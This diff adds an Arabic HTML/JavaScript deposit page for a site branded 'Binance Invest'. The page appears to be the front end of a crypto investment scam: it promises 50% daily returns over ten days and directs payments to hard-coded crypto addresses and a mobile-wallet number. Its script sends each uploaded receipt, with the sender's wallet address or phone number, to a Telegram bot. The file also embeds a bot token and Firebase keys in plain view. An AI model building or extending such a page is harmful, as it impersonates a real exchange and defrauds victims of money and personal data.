@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, maximum-scale=1.0, user-scalable=no" />
+    <title>Binance Invest • إيداع</title>
+    <meta name="description" content="صفحة الإيداع في Binance Invest - اختر طريقة الدفع المناسبة لك." />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+    <style>
+        :root {
+            --bg-deep: #070b1a;
+            --card-bg: rgba(20, 30, 60, 0.05);
+            --gold: #f3ba2f;
+            --gold-light: #fcd970;
+            --gold-dark: #b8871e;
+            --text: #ffffff;
+            --text-dim: #e0e5f0;
+            --text-muted: #b0b8d0;
+            --border-light: rgba(255, 255, 255, 0.08);
+            --sidebar-width: 260px;
+            --radius-xl: 24px;
+            --radius-lg: 18px;
+            --transition: 0.3s cubic-bezier(0.23, 1, 0.32, 1);
+            --gap: 20px;
+            --padding-section: 24px;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background-color: var(--bg-deep);
+            color: var(--text);
+            line-height: 1.6;
+            direction: rtl;
+            display: flex;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+            touch-action: pan-y;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: url('qq.png') center/90% no-repeat;
+            z-index: -3;
+            opacity: 1;
+            filter: brightness(1.15) saturate(1.1);
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: radial-gradient(circle at 20% 30%, rgba(10, 17, 40, 0.05) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 70%, rgba(10, 17, 40, 0.08) 0%, transparent 70%),
+                        linear-gradient(180deg, rgba(7, 11, 26, 0.05) 0%, rgba(7, 11, 26, 0.1) 100%);
+            z-index: -2;
+            backdrop-filter: none;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(20, 30, 60, 0.9);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--gold);
+            color: var(--gold);
+            padding: 14px 28px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 14px;
+            z-index: 9999;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            opacity: 0;
+            transition: opacity 0.4s ease, transform 0.4s ease;
+            pointer-events: none;
+        }
+        .toast.show { opacity: 1; transform: translateX(-50%) translateY(-10px); }
+
+        .sidebar-overlay {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 40;
+            opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+        .sidebar-overlay.active { opacity: 1; visibility: visible; }
+
+        .sidebar {
+            width: var(--sidebar-width); background: rgba(10,17,40,0.85); backdrop-filter: blur(30px);
+            border-left: 1px solid rgba(255,255,255,0.1); padding: 24px 16px;
+            display: flex; flex-direction: column; position: fixed; top: 0; right: 0; bottom: 0;
+            z-index: 50; transition: transform var(--transition); transform: translateX(0);
+            overflow-y: auto;
+        }
+        .sidebar-logo { display: flex; align-items: center; gap: 10px; margin-bottom: 36px; padding: 0 8px; }
+        .sidebar-logo .icon {
+            width: 40px; height: 40px; border-radius: 10px; background: rgba(243,186,47,0.15);
+            border: 1px solid rgba(243,186,47,0.4); overflow: hidden; display: flex;
+            align-items: center; justify-content: center; box-shadow: 0 0 15px rgba(243,186,47,0.3);
+        }
+        .sidebar-logo .icon img { width: 100%; height: 100%; object-fit: cover; }
+        .sidebar-logo .text { font-weight: 900; font-size: 18px; color: var(--gold); text-shadow: 0 0 15px rgba(243,186,47,0.4); }
+        .nav-menu { list-style: none; flex: 1; overflow-y: auto; }
+        .nav-menu li { margin-bottom: 6px; }
+        .nav-menu a {
+            display: flex; align-items: center; gap: 12px; padding: 12px 16px; border-radius: 14px;
+            color: var(--text-dim); text-decoration: none; font-weight: 500; font-size: 14px;
+            transition: all 0.2s; cursor: pointer;
+        }
+        .nav-menu a:hover, .nav-menu a.active { background: rgba(243,186,47,0.15); color: var(--gold); box-shadow: 0 0 15px rgba(243,186,47,0.1); }
+        .nav-menu a .emoji { font-size: 18px; }
+        .sidebar-footer {
+            margin-top: auto; padding: 16px 0 0; border-top: 1px solid rgba(255,255,255,0.08);
+            font-size: 12px; color: var(--text-muted); text-align: center;
+        }
+        .user-info { display: flex; align-items: center; gap: 10px; padding: 10px; margin-bottom: 12px; background: rgba(255,255,255,0.03); border-radius: 14px; }
+        .user-avatar {
+            width: 38px; height: 38px; border-radius: 50%; background: linear-gradient(135deg, var(--gold), var(--gold-dark));
+            display: flex; align-items: center; justify-content: center; font-weight: 800; color: #0a0f1e; font-size: 16px; flex-shrink: 0;
+        }
+        .user-name { font-weight: 600; font-size: 13px; color: var(--text); }
+
+        .main-content {
+            flex: 1; margin-right: var(--sidebar-width); padding: var(--padding-section);
+            transition: margin var(--transition); display: flex; flex-direction: column; gap: var(--gap);
+            overflow-x: hidden; touch-action: pan-y;
+        }
+        .top-bar { display: flex; justify-content: space-between; align-items: center; }
+        .page-title h1 { font-size: 26px; font-weight: 900; text-shadow: 0 0 25px rgba(0,0,0,0.9); }
+        .page-title .gold { color: var(--gold); text-shadow: 0 0 25px rgba(0,0,0,0.9); }
+        .page-title p { font-size: 13px; color: var(--text-dim); text-shadow: 0 0 15px rgba(0,0,0,0.9); margin-top: 2px; }
+        .top-actions { display: flex; gap: 12px; align-items: center; }
+        .btn {
+            background: linear-gradient(135deg, var(--gold) 0%, var(--gold-dark) 100%); color: #0a0f1e;
+            font-weight: 700; padding: 10px 20px; border-radius: 40px; border: none; cursor: pointer;
+            font-family: inherit; font-size: 13px; box-shadow: 0 8px 20px rgba(243,186,47,0.35);
+            transition: all 0.2s; text-decoration: none; display: inline-flex; align-items: center; gap: 6px;
+        }
+        .btn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 12px 28px rgba(243,186,47,0.5); }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        .btn-outline {
+            background: transparent; color: var(--gold); border: 1px solid rgba(243,186,47,0.6);
+            box-shadow: none; text-shadow: 0 0 10px rgba(0,0,0,0.8);
+        }
+        .btn-outline:hover { background: rgba(243,186,47,0.15); }
+        .menu-toggle { display: none; background: none; border: none; color: var(--text); font-size: 24px; cursor: pointer; text-shadow: 0 0 10px rgba(0,0,0,0.8); }
+
+        /* ========== بطاقة الخطة المختارة ========== */
+        .selected-plan-banner {
+            display: none;
+            background: linear-gradient(135deg, rgba(243,186,47,0.15), rgba(243,186,47,0.05));
+            border: 2px solid var(--gold);
+            border-radius: var(--radius-xl);
+            padding: 18px 22px;
+            box-shadow: 0 10px 30px rgba(243,186,47,0.2), 0 0 0 1px rgba(243,186,47,0.2) inset;
+            animation: fadeInUp 0.5s ease;
+        }
+        .selected-plan-banner.show { display: flex; align-items: center; gap: 16px; flex-wrap: wrap; }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(-15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .selected-plan-banner .plan-icon {
+            width: 56px; height: 56px; border-radius: 16px;
+            background: rgba(243,186,47,0.2);
+            border: 1px solid rgba(243,186,47,0.5);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 28px; flex-shrink: 0;
+        }
+        .selected-plan-banner .plan-info { flex: 1; min-width: 200px; }
+        .selected-plan-banner .plan-info .lbl {
+            font-size: 12px; color: var(--text-muted);
+            letter-spacing: 0.5px; margin-bottom: 4px;
+        }
+        .selected-plan-banner .plan-info .name {
+            font-size: 22px; font-weight: 900; color: var(--gold);
+            text-shadow: 0 0 15px rgba(243,186,47,0.4);
+        }
+        .selected-plan-banner .plan-meta {
+            display: flex; gap: 20px; flex-wrap: wrap;
+        }
+        .selected-plan-banner .plan-meta .meta-item {
+            display: flex; flex-direction: column; align-items: flex-end;
+        }
+        .selected-plan-banner .plan-meta .meta-item .lbl {
+            font-size: 11px; color: var(--text-muted);
+        }
+        .selected-plan-banner .plan-meta .meta-item .val {
+            font-size: 16px; font-weight: 800; color: var(--text-dim);
+            direction: ltr;
+        }
+        .selected-plan-banner .plan-meta .meta-item .val.gold { color: var(--gold); }
+
+        .deposit-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: var(--gap);
+            align-items: start;
+        }
+        .card {
+            background: rgba(20, 30, 60, 0.05);
+            backdrop-filter: blur(3px);
+            border: 1px solid rgba(243, 186, 47, 0.35);
+            border-radius: var(--radius-xl);
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            text-shadow: 0 0 15px rgba(0,0,0,0.9);
+            transition: background 0.3s;
+        }
+        .card:hover { background: rgba(20, 30, 60, 0.1); }
+        .card h2 { font-size: 20px; font-weight: 800; color: var(--text); margin-bottom: 4px; }
+        .card h2 .gold { color: var(--gold); }
+        .card .subtitle { font-size: 13px; color: var(--text-dim); margin-bottom: 8px; }
+        .form-group { margin-bottom: 4px; text-align: right; }
+        .form-group label { display: block; font-size: 12px; font-weight: 600; color: var(--text-dim); margin-bottom: 4px; }
+        .form-group input {
+            width: 100%; padding: 12px 14px; border-radius: 12px;
+            border: 1px solid rgba(243, 186, 47, 0.5); background: rgba(0, 0, 0, 0.4);
+            color: var(--text); font-family: inherit; font-size: 14px; outline: none;
+        }
+        .address-box {
+            background: rgba(0, 0, 0, 0.5); border: 1px solid rgba(243, 186, 47, 0.5);
+            border-radius: 12px; padding: 12px; display: flex;
+            justify-content: space-between; align-items: center;
+            font-family: monospace; direction: ltr; text-align: left;
+            word-break: break-all; color: #ffffff; font-size: 13px;
+        }
+        .address-box .copy-btn { background: none; border: none; color: var(--gold); cursor: pointer; font-size: 16px; }
+        .network-select {
+            width: 100%; padding: 12px 14px; border-radius: 12px;
+            border: 1px solid rgba(243, 186, 47, 0.5); background: rgba(0, 0, 0, 0.4);
+            color: var(--text); font-family: inherit; font-size: 14px; outline: none;
+        }
+        .network-select option { background: #0a1128; color: #fff; }
+        .phone-number { font-size: 24px; letter-spacing: 2px; color: var(--gold); font-weight: 700; }
+        .file-upload-area {
+            border: 2px dashed rgba(243, 186, 47, 0.6);
+            border-radius: 16px; padding: 20px; text-align: center;
+            cursor: pointer; transition: 0.3s; background: rgba(0,0,0,0.2);
+        }
+        .file-upload-area:hover { border-color: var(--gold); background: rgba(243, 186, 47, 0.1); }
+        .file-upload-area input { display: none; }
+        .preview-img { max-width: 100%; max-height: 200px; border-radius: 12px; margin-top: 12px; }
+        .send-btn { width: 100%; padding: 14px; font-size: 16px; font-weight: 800; }
+        .success-message {
+            background: rgba(34, 197, 94, 0.3); color: #22c55e;
+            padding: 10px; border-radius: 12px; text-align: center;
+            font-weight: 600; display: none;
+        }
+
+        /* 🔄 Loading spinner */
+        .btn-loading {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(10, 15, 30, 0.3);
+            border-top-color: #0a0f1e;
+            border-radius: 50%;
+            animation: btnSpin 0.8s linear infinite;
+            margin-right: 6px;
+            vertical-align: middle;
+        }
+        @keyframes btnSpin { to { transform: rotate(360deg); } }
+
+        @media (max-width: 768px) {
+            .deposit-grid { grid-template-columns: 1fr; }
+            .sidebar { transform: translateX(100%); }
+            .sidebar.open { transform: translateX(0); }
+            .main-content { margin-right: 0; padding: 16px; }
+            .menu-toggle { display: block; }
+            .top-bar { flex-wrap: wrap; gap: 12px; }
+            .top-actions { flex-wrap: wrap; }
+            .selected-plan-banner .plan-meta { width: 100%; justify-content: space-between; }
+        }
+    </style>
+</head>
+<body>
+    <div class="sidebar-overlay" id="sidebarOverlay"></div>
+    <div class="toast" id="toast"></div>
+
+    <aside class="sidebar" id="sidebar">
+        <div class="sidebar-logo">
+            <div class="icon"><img src="qa.png" alt="Logo" /></div>
+            <span class="text">BINANCE</span>
+        </div>
+        <div class="user-info">
+            <div class="user-avatar" id="sidebarAvatar">م</div>
+            <div>
+                <div class="user-name" id="sidebarUserName">محمد أحمد</div>
+                <div style="font-size:10px;color:var(--text-muted)">مستثمر فضي</div>
+            </div>
+        </div>
+        <ul class="nav-menu" id="navMenu">
+            <li><a href="dashboard.html"><span class="emoji">📊</span> نظرة عامة</a></li>
+            <li><a href="investments.html"><span class="emoji">💼</span> الاستثمارات النشطة</a></li>
+            <li><a href="my-plan.html"><span class="emoji">🎯</span> خطتي</a></li>
+            <li><a href="wallet.html"><span class="emoji">💰</span> المحفظة</a></li>
+            <li><a href="withdraw.html"><span class="emoji">📤</span> سحب الأرباح</a></li>
+            <li><a href="deposit.html" class="active"><span class="emoji">💳</span> الإيداع</a></li>
+            <li><a href="transactions.html"><span class="emoji">📋</span> المعاملات</a></li>
+            <li><a href="activity.html"><span class="emoji">🔄</span> نشاط المنصة</a></li>
+            <li><a href="settings.html"><span class="emoji">⚙️</span> الإعدادات</a></li>
+            <li><a href="index.html"><span class="emoji">🚪</span> تسجيل الخروج</a></li>
+        </ul>
+        <div class="sidebar-footer">© 2026 Binance Invest</div>
+    </aside>
+
+    <main class="main-content" id="mainContent">
+        <div class="top-bar">
+            <button class="menu-toggle" id="menuToggle">☰</button>
+            <div class="page-title">
+                <h1>صفحة <span class="gold">الإيداع</span></h1>
+                <p>اختر طريقة الإيداع المناسبة وأرسل إثبات التحويل</p>
+            </div>
+            <div class="top-actions">
+                <a href="dashboard.html" class="btn btn-outline">📊 لوحة التحكم</a>
+            </div>
+        </div>
+
+        <!-- بطاقة الخطة المختارة -->
+        <div class="selected-plan-banner" id="selectedPlanBanner">
+            <div class="plan-icon">🎯</div>
+            <div class="plan-info">
+                <div class="lbl">الخطة المختارة</div>
+                <div class="name" id="bannerPlanName">-</div>
+            </div>
+            <div class="plan-meta">
+                <div class="meta-item">
+                    <span class="lbl">مبلغ الاستثمار</span>
+                    <span class="val gold" id="bannerPlanAmount" lang="en">$0</span>
+                </div>
+                <div class="meta-item">
+                    <span class="lbl">الربح اليومي</span>
+                    <span class="val" id="bannerPlanDaily" lang="en">$0</span>
+                </div>
+                <div class="meta-item">
+                    <span class="lbl">المدة</span>
+                    <span class="val">10 أيام</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="deposit-grid">
+            <!-- القسم الأول: المحافظ الرقمية -->
+            <div class="card">
+                <h2>🪙 <span class="gold">محفظة رقمية</span></h2>
+                <p class="subtitle">اختر العملة الرقمية وعنوان التحويل</p>
+                <select class="network-select" id="cryptoNetwork" onchange="updateCryptoAddress()">
+                    <option value="trc20">Tron (TRC20)</option>
+                    <option value="erc20">Ethereum (ERC20)</option>
+                    <option value="polygon">Polygon (USDT)</option>
+                    <option value="solana">Solana</option>
+                    <option value="ton">The Open Network (TON)</option>
+                </select>
+                <div class="address-box" id="cryptoAddressBox">
+                    <span id="cryptoAddress">TPNgUyRe7GSnazUzakRU3egEU4XBS7Pu5h</span>
+                    <button class="copy-btn" onclick="copyAddress()" title="نسخ العنوان">📋</button>
+                </div>
+                <div class="form-group">
+                    <label>المبلغ المحول ($)</label>
+                    <input type="number" id="cryptoAmount" placeholder="أدخل المبلغ الذي قمت بتحويله" required />
+                </div>
+                <div class="form-group">
+                    <label>عنوان محفظتك المرسلة</label>
+                    <input type="text" id="cryptoSenderAddress" placeholder="أدخل عنوان المحفظة التي أرسلت منها" required />
+                </div>
+                <div id="uploadAreaCrypto" class="file-upload-area">
+                    <p>📎 اضغط هنا لرفع إيصال التحويل</p>
+                    <input type="file" id="cryptoFile" accept="image/*" onchange="previewImage(this, 'cryptoPreview')">
+                    <img id="cryptoPreview" class="preview-img" style="display:none;">
+                </div>
+                <button class="btn send-btn" id="cryptoBtn" onclick="sendDeposit('crypto')">🚀 إرسال إثبات التحويل</button>
+                <div class="success-message" id="cryptoSuccess">✅ تم الإرسال بنجاح! سنراجع التحويل.</div>
+            </div>
+
+            <!-- القسم الثاني: المحافظ الإلكترونية -->
+            <div class="card">
+                <h2>📱 <span class="gold">محافظ إلكترونية</span></h2>
+                <p class="subtitle">فودافون كاش / اورانج كاش / اتصالات كاش / وي كاش</p>
+                <div style="display: flex; align-items: center; gap: 12px; margin: 12px 0;">
+                    <span style="color: var(--text-dim);">رقم التحويل:</span>
+                    <span class="phone-number" id="phoneNumber">01213959111</span>
+                    <button class="copy-btn" onclick="copyPhone()" title="نسخ الرقم">📋</button>
+                </div>
+                <div class="form-group">
+                    <label>المبلغ المحول ($)</label>
+                    <input type="number" id="walletAmount" placeholder="أدخل المبلغ الذي قمت بتحويله" required />
+                </div>
+                <div class="form-group">
+                    <label>رقم هاتفك الذي قمت بالتحويل منه</label>
+                    <input type="text" id="walletSenderPhone" placeholder="01xxxxxxxxx" required />
+                </div>
+                <div id="uploadAreaWallet" class="file-upload-area">
+                    <p>📎 اضغط هنا لرفع إيصال التحويل</p>
+                    <input type="file" id="walletFile" accept="image/*" onchange="previewImage(this, 'walletPreview')">
+                    <img id="walletPreview" class="preview-img" style="display:none;">
+                </div>
+                <button class="btn send-btn" id="walletBtn" onclick="sendDeposit('wallet')">🚀 إرسال إثبات التحويل</button>
+                <div class="success-message" id="walletSuccess">✅ تم الإرسال بنجاح! سنراجع التحويل.</div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        // ========== تهيئة Firebase ==========
+        const firebaseConfig = {
+            apiKey: "AIzaSyB78JT_cbPMizvzKWBrQoQUe3-zukHrr1U",
+            authDomain: "pharacoin.firebaseapp.com",
+            projectId: "pharacoin",
+            storageBucket: "pharacoin.firebasestorage.app",
+            messagingSenderId: "1047668783635",
+            appId: "1:1047668783635:web:10673630ede69c60181de6",
+            measurementId: "G-06CG470MPX"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.firestore();
+        let currentUser = null;
+
+        // 🎯 القيم الموحدة للحالات
+        const STATUS = {
+            PENDING: 'pending',
+            COMPLETED: 'completed',
+            REJECTED: 'rejected'
+        };
+
+        // 🔄 منع الإرسال المتكرر
+        let isSending = false;
+
+        // ========== بيانات الخطط ==========
+        const planData = {
+            starter: { name: 'الباقة المبتدئة', amount: 10, daily: 5, duration: 10 },
+            bronze: { name: 'الباقة البرونزية', amount: 30, daily: 15, duration: 10 },
+            silver: { name: 'الباقة الفضية', amount: 100, daily: 50, duration: 10 },
+            gold: { name: 'الباقة الذهبية', amount: 500, daily: 250, duration: 10 },
+            diamond: { name: 'الباقة الماسية', amount: 1000, daily: 500, duration: 10 }
+        };
+
+        // ========== قراءة الخطة المحددة من الرابط ==========
+        const urlParams = new URLSearchParams(window.location.search);
+        const selectedPlan = urlParams.get('plan') || '';
+
+        function displaySelectedPlan() {
+            if (!selectedPlan || !planData[selectedPlan]) return;
+            const p = planData[selectedPlan];
+            document.getElementById('bannerPlanName').textContent = p.name;
+            document.getElementById('bannerPlanAmount').textContent = '$' + p.amount.toLocaleString('en-US');
+            document.getElementById('bannerPlanDaily').textContent = '$' + p.daily.toLocaleString('en-US');
+            document.getElementById('selectedPlanBanner').classList.add('show');
+        }
+        displaySelectedPlan();
+
+        // ========== مراقبة حالة المستخدم ==========
+        auth.onAuthStateChanged(async user => {
+            currentUser = user;
+            if (user) {
+                try {
+                    const doc = await db.collection('users').doc(user.uid).get();
+                    if (doc.exists) {
+                        const data = doc.data();
+                        if (data.fullName) {
+                            document.getElementById('sidebarUserName').textContent = data.fullName;
+                            document.getElementById('sidebarAvatar').textContent = data.fullName.charAt(0);
+                        }
+                    }
+                } catch (e) {
+                    console.log('تعذر تحديث اسم المستخدم');
+                }
+            }
+        });
+
+        // ========== دوال مساعدة ==========
+        function showToast(message) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.classList.add('show');
+            clearTimeout(window.toastTimeout);
+            window.toastTimeout = setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+
+        const addresses = {
+            trc20: 'TPNgUyRe7GSnazUzakRU3egEU4XBS7Pu5h',
+            erc20: '0x9a707ce9ec3fb6ac9977a5aab27c01f22d66fca9',
+            polygon: '0x9a707ce9ec3fb6ac9977a5aab27c01f22d66fca9',
+            solana: 'HZjw4U5SDyVef9pubyWM7hsEqXoU36q1vX9xtmNSadtQ',
+            ton: 'UQCW56SpyYodKyWt9msHDIfMGxikQER4IcAJiYP9OOOVZbhg'
+        };
+
+        function updateCryptoAddress() {
+            const network = document.getElementById('cryptoNetwork').value;
+            document.getElementById('cryptoAddress').textContent = addresses[network];
+        }
+
+        function copyAddress() {
+            const addr = document.getElementById('cryptoAddress').textContent;
+            navigator.clipboard.writeText(addr).then(() => showToast('✅ تم نسخ العنوان بنجاح'))
+                .catch(() => showToast('⚠️ تعذر النسخ'));
+        }
+
+        function copyPhone() {
+            const phone = document.getElementById('phoneNumber').textContent;
+            navigator.clipboard.writeText(phone).then(() => showToast('✅ تم نسخ الرقم بنجاح'))
+                .catch(() => showToast('⚠️ تعذر النسخ'));
+        }
+
+        function previewImage(input, previewId) {
+            const file = input.files[0];
+            const preview = document.getElementById(previewId);
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    preview.src = e.target.result;
+                    preview.style.display = 'block';
+                };
+                reader.readAsDataURL(file);
+            }
+        }
+
+        // ========== ✅ إنشاء استثمار معلق ==========
+        async function createPendingInvestment(planKey, amount) {
+            if (!planKey || !currentUser) return null;
+            const planInfo = planData[planKey] || planData.silver;
+            const numericAmount = parseFloat(amount);
+            const investment = {
+                id: 'inv_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6),
+                planKey: planKey,
+                planName: planInfo.name,
+                amount: numericAmount,
+                status: STATUS.PENDING,
+                startDate: null,
+                endDate: null,
+                accumulatedProfit: 0,
+                dailyProfit: numericAmount * 0.5,
+                durationDays: planInfo.duration,
+                createdAt: new Date().toISOString()
+            };
+
+            // حفظ محلي
+            try {
+                const investments = JSON.parse(localStorage.getItem('binance_investments_data') || '[]');
+                investments.push(investment);
+                localStorage.setItem('binance_investments_data', JSON.stringify(investments));
+            } catch (e) {}
+
+            // حفظ في Firestore
+            try {
+                await db.collection('users').doc(currentUser.uid).update({
+                    investments: firebase.firestore.FieldValue.arrayUnion(investment)
+                });
+                console.log('✅ تم إضافة الاستثمار المعلق إلى Firestore');
+            } catch (error) {
+                await db.collection('users').doc(currentUser.uid).set({
+                    investments: [investment]
+                }, { merge: true });
+                console.log('✅ تم إنشاء مصفوفة الاستثمارات جديدة');
+            }
+
+            return investment;
+        }
+
+        // ========== 🚀 إرسال الإيداع ==========
+        async function sendDeposit(type) {
+            // 🔄 منع الإرسال المتكرر
+            if (isSending) {
+                showToast('⚠️ جاري الإرسال، يرجى الانتظار...');
+                return;
+            }
+
+            const token = "8535863939:AAFC4qgREiGQC-4c1QCQNrNp3gMprRsQRTs";
+            const chat_id = "6733319757";
+            const fileInput = document.getElementById(type === 'crypto' ? 'cryptoFile' : 'walletFile');
+            const btn = document.getElementById(type === 'crypto' ? 'cryptoBtn' : 'walletBtn');
+            const file = fileInput.files[0];
+            const successDiv = document.getElementById(type === 'crypto' ? 'cryptoSuccess' : 'walletSuccess');
+
+            if (!file) { showToast('⚠️ الرجاء رفع إيصال التحويل أولاً'); return; }
+
+            if (!currentUser) {
+                showToast('⚠️ يجب تسجيل الدخول أولاً');
+                return;
+            }
+
+            let amount, senderInfo, caption, depositData;
+
+            depositData = {
+                type: type,
+                status: STATUS.PENDING,  // ✅ موحّد
+                createdAt: firebase.firestore.FieldValue.serverTimestamp()
+            };
+
+            // ✅ إضافة بيانات الخطة المختارة
+            if (selectedPlan && planData[selectedPlan]) {
+                depositData.planKey = selectedPlan;
+                depositData.planName = planData[selectedPlan].name;
+                depositData.planAmount = planData[selectedPlan].amount;
+                depositData.planDuration = planData[selectedPlan].duration;
+            }
+
+            if (type === 'crypto') {
+                amount = document.getElementById('cryptoAmount').value.trim();
+                senderInfo = document.getElementById('cryptoSenderAddress').value.trim();
+                const network = document.getElementById('cryptoNetwork').value;
+
+                if (!amount || isNaN(amount) || amount <= 0) { showToast('⚠️ الرجاء إدخال مبلغ صحيح'); return; }
+                if (!senderInfo) { showToast('⚠️ الرجاء إدخال عنوان محفظتك المرسلة'); return; }
+
+                const planLine = selectedPlan && planData[selectedPlan] ? `\n🎯 الخطة: ${planData[selectedPlan].name}` : '';
+                caption = `إيداع جديد - محفظة رقمية${planLine}\nالعملة: ${network}\nالعنوان المستقبل: ${addresses[network]}\nالمبلغ: $${amount}\nمرسل من: ${senderInfo}`;
+                depositData.network = network;
+                depositData.address = addresses[network];
+                depositData.amount = parseFloat(amount);
+                depositData.senderAddress = senderInfo;
+            } else {
+                amount = document.getElementById('walletAmount').value.trim();
+                senderInfo = document.getElementById('walletSenderPhone').value.trim();
+
+                if (!amount || isNaN(amount) || amount <= 0) { showToast('⚠️ الرجاء إدخال مبلغ صحيح'); return; }
+                if (!senderInfo) { showToast('⚠️ الرجاء إدخال رقم هاتفك الذي قمت بالتحويل منه'); return; }
+
+                const planLine = selectedPlan && planData[selectedPlan] ? `\n🎯 الخطة: ${planData[selectedPlan].name}` : '';
+                caption = `إيداع جديد - محفظة إلكترونية${planLine}\nالرقم المستقبل: 01213959111\nالمبلغ: $${amount}\nمرسل من: ${senderInfo}`;
+                depositData.phoneNumber = '01213959111';
+                depositData.amount = parseFloat(amount);
+                depositData.senderPhone = senderInfo;
+            }
+
+            // ✅ إضافة بيانات المستخدم
+            depositData.userId = currentUser.uid;
+            try {
+                const userDoc = await db.collection('users').doc(currentUser.uid).get();
+                if (userDoc.exists && userDoc.data().fullName) {
+                    depositData.userName = userDoc.data().fullName;
+                }
+            } catch (e) {}
+
+            // 🔄 تعطيل الزر
+            isSending = true;
+            if (btn) {
+                btn.disabled = true;
+                btn.innerHTML = '<span class="btn-loading"></span> جاري الإرسال...';
+            }
+
+            const formData = new FormData();
+            formData.append('chat_id', chat_id);
+            formData.append('photo', file);
+            formData.append('caption', caption);
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.json();
+
+                if (data.ok) {
+                    // ✅ حفظ معرف الإيصال من Telegram
+                    if (data.result && data.result.photo && data.result.photo.length > 0) {
+                        const largestPhoto = data.result.photo[data.result.photo.length - 1];
+                        depositData.receiptFileId = largestPhoto.file_id;
+                        depositData.telegramMessageId = data.result.message_id;
+                        console.log('✅ receiptFileId:', largestPhoto.file_id);
+                    }
+
+                    // ✅ حفظ الإيداع في Firestore
+                    const depositRef = await db.collection('deposits').add(depositData);
+                    console.log('✅ تم حفظ الإيداع في Firestore:', depositRef.id);
+
+                    // ✅ إنشاء استثمار معلق
+                    if (selectedPlan) {
+                        await createPendingInvestment(selectedPlan, amount);
+                    }
+
+                    // ✅ عرض النجاح
+                    successDiv.style.display = 'block';
+                    fileInput.value = '';
+                    document.getElementById(type === 'crypto' ? 'cryptoPreview' : 'walletPreview').style.display = 'none';
+                    document.getElementById(type === 'crypto' ? 'cryptoAmount' : 'walletAmount').value = '';
+                    document.getElementById(type === 'crypto' ? 'cryptoSenderAddress' : 'walletSenderPhone').value = '';
+                    showToast('✅ تم إرسال الإيصال بنجاح');
+                    setTimeout(() => { successDiv.style.display = 'none'; }, 5000);
+                } else {
+                    showToast('❌ حدث خطأ: ' + data.description);
+                }
+            } catch (error) {
+                console.error('❌ خطأ:', error);
+                showToast('❌ فشل الاتصال، حاول مرة أخرى');
+            } finally {
+                // 🔄 إعادة تفعيل الزر
+                isSending = false;
+                if (btn) {
+                    btn.disabled = false;
+                    btn.innerHTML = '🚀 إرسال إثبات التحويل';
+                }
+            }
+        }
+
+        // Sidebar toggle
+        const menuToggle = document.getElementById('menuToggle');
+        const sidebar = document.getElementById('sidebar');
+        const overlay = document.getElementById('sidebarOverlay');
+        function openSidebar() { sidebar.classList.add('open'); overlay.classList.add('active'); document.body.style.overflow = 'hidden'; }
+        function closeSidebar() { sidebar.classList.remove('open'); overlay.classList.remove('active'); document.body.style.overflow = ''; }
+        menuToggle.addEventListener('click', () => sidebar.classList.contains('open') ? closeSidebar() : openSidebar());
+        overlay.addEventListener('click', closeSidebar);
+
+        document.querySelectorAll('.file-upload-area').forEach(area => {
+            area.addEventListener('click', () => area.querySelector('input[type="file"]').click());
+        });
+
+        // تفعيل الرابط النشط تلقائيًا
+        const currentPage = window.location.pathname.split('/').pop() || 'dashboard.html';
+        document.querySelectorAll('#navMenu a').forEach(link => {
+            link.classList.toggle('active', link.getAttribute('href') === currentPage);
+        });
+    </script>
+</body>
+</html>
